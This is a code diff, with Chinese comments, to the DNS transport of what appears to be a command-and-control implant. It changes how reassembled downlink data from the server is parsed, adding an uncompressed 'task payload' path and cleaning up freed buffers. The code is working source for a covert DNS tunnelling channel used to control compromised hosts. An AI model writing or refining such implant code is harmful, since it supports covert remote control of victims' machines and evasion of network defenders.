@@ -618,7 +618,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                 memcpy(this->downBuf + offset, respBuf + headerSize, n);
                 this->downFilled += n;
                 if (this->downFilled >= this->downTotal) {
-                    // 解析压缩头：1 字节 flags + 4 字节原始长度（小端）。
+                    // 解析会话头：[flags][orig_len_le]，然后将原始 payload 交给上层。
                     BYTE* finalBuf   = this->downBuf;
                     ULONG finalSize  = this->downTotal;
                     if (this->downTotal > 5) {
@@ -628,8 +628,10 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                         orig |= ((ULONG)this->downBuf[2] << 8);
                         orig |= ((ULONG)this->downBuf[3] << 16);
                         orig |= ((ULONG)this->downBuf[4] << 24);
+
                         if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
-                            // 尝试解压缩
+                            // 若未来启用下行压缩，这里可以根据 flags 进行解压。
+                            // 目前 Go 端下行不再压缩，因此这一分支通常不会触发。
                             ULONG ws1 = 0, ws2 = 0;
                             if (NT_SUCCESS(ApiNt->RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &ws1, &ws2))) {
                                 PVOID work = MemAllocLocal(ws1);
@@ -639,20 +641,30 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
                                         ULONG outSize = 0;
                                         NTSTATUS st = ApiNt->RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, outBuf, orig, this->downBuf + 5, this->downTotal - 5, &outSize);
                                         if (NT_SUCCESS(st) && outSize == orig) {
-                                            // 使用解压后的缓冲
                                             finalBuf  = outBuf;
                                             finalSize = outSize;
-                                            // 原始压缩缓冲释放
                                             MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                                            this->downBuf = NULL;
                                         } else {
                                             MemFreeLocal((LPVOID*)&outBuf, orig);
                                         }
                                     }
-                                    MemFreeLocal(&work, ws1);
+                                    MemFreeLocal((LPVOID*)&work, ws1);
                                 }
+                            }
+                        } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
+                            // 无压缩：直接跳过 5 字节头部，仅将原始任务 payload 交给上层。
+                            BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
+                            if (outBuf) {
+                                memcpy(outBuf, this->downBuf + 5, orig);
+                                finalBuf  = outBuf;
+                                finalSize = orig;
+                                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+                                this->downBuf = NULL;
                             }
                         }
                     }
+
                     this->recvData = finalBuf;
                     this->recvSize = (int)finalSize;
                     // 记录本次下行总量，供自适应 sleep 使用
